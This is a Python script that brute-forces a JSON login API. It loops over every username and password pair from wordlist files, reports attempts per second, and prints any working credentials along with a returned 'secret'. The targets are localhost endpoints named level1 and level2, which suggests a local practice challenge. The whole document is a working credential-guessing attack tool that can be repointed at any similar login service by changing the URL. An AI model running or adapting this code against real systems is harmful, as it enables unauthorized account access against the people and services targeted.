import time
import requests


def load_list(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def brute_force(api_url: str, usernames: list[str], passwords: list[str], timeout: float = 5.0):
    start = time.perf_counter()
    attempts = 0

    with requests.Session() as session:
        session.headers.update({"Content-Type": "application/json"})

        for u in usernames:
            for p in passwords:
                attempts += 1
                try:
                    r = session.post(api_url, json={"username": u, "password": p}, timeout=timeout)
                except requests.RequestException:
                    continue

                if r.status_code != 200:
                    continue

                try:
                    data = r.json()
                except ValueError:
                    continue

                if data.get("success") is True:
                    elapsed = time.perf_counter() - start
                    return u, p, data.get("secret"), elapsed, attempts

                if attempts % 5000 == 0:
                    elapsed = time.perf_counter() - start
                    rate = attempts / elapsed if elapsed > 0 else 0
                    print(f"Tried {attempts:,} combos | {rate:,.0f} attempts/sec")

    elapsed = time.perf_counter() - start
    return None, None, None, elapsed, attempts


def run_level(level: int):
    if level == 1:
        api_url = "http://127.0.0.1:5000/api/level1"
        usernames_file = "usernames_level1.txt"
        passwords_file = "passwords_level1.txt"
    elif level == 2:
        api_url = "http://127.0.0.1:5000/api/level2"
        usernames_file = "usernames_level2.txt"
        passwords_file = "passwords_level2.txt"
    else:
        raise ValueError("Level must be 1 or 2")

    usernames = load_list(usernames_file)
    passwords = load_list(passwords_file)

    print(f"\n=== Level {level} ===")
    print(f"API: {api_url}")
    print(f"Usernames: {len(usernames):,}")
    print(f"Passwords: {len(passwords):,}")
    print(f"Total combos: {len(usernames) * len(passwords):,}\n")

    u, p, secret, elapsed, attempts = brute_force(api_url, usernames, passwords)

    print("\n--- Result ---")
    print(f"Attempts tried: {attempts:,}")
    print(f"Time taken: {elapsed:.2f} seconds")

    if u and p:
        print(f"FOUND username: {u}")
        print(f"FOUND password: {p}")
        if secret is not None:
            print(f"Secret message: {secret}")
    else:
        print("No valid credentials found. Check the server is running and lists are correct.")


if __name__ == "__main__":
    run_level(1)
    run_level(2)
